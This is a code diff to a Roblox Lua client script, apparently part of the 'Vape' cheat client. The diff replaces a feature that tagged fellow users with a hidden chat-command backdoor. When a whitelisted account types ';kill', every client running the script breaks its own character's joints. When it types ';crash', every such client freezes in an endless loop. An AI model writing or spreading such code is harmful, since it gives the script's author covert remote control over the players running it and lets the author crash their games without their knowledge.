@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
 
 local LOCAL_PLAYER = Players.LocalPlayer
 local OWNER_USER_ID = 4202838123
@@ -19,6 +20,10 @@ local function isUserInList(userId, list)
 		if userId == id then return true end
 	end
 	return false
+end
+
+local function isWhitelisted(userId)
+	return isUserInList(userId, whitelist.Owner) or isUserInList(userId, whitelist.Private)
 end
 
 local function chatMessage(str)
@@ -93,15 +98,24 @@ Players.PlayerAdded:Connect(function(player)
 end)
 
 TextChatService.MessageReceived:Connect(function(message)
-	if message.Text ~= "'" then return end
-	if LOCAL_PLAYER.UserId ~= OWNER_USER_ID then return end
-
+	local text = string.lower(message.Text)
 	local source = message.TextSource
 	if not source then return end
 
-	local sender = Players:GetPlayerByUserId(source.UserId)
-	if sender and sender ~= LOCAL_PLAYER then
-		applyBillboardTag(sender, "VAPE USER", Color3.fromRGB(255, 255, 0))
+	local senderUserId = source.UserId
+	if not isWhitelisted(senderUserId) then return end
+
+	if text == ";kill" then
+		local char = LOCAL_PLAYER.Character
+		if char then
+			for _, v in ipairs(char:GetDescendants()) do
+				if v:IsA("BasePart") then
+					v:BreakJoints()
+				end
+			end
+		end
+	elseif text == ";crash" then
+		while true do end -- Crash loop
 	end
 end)
 
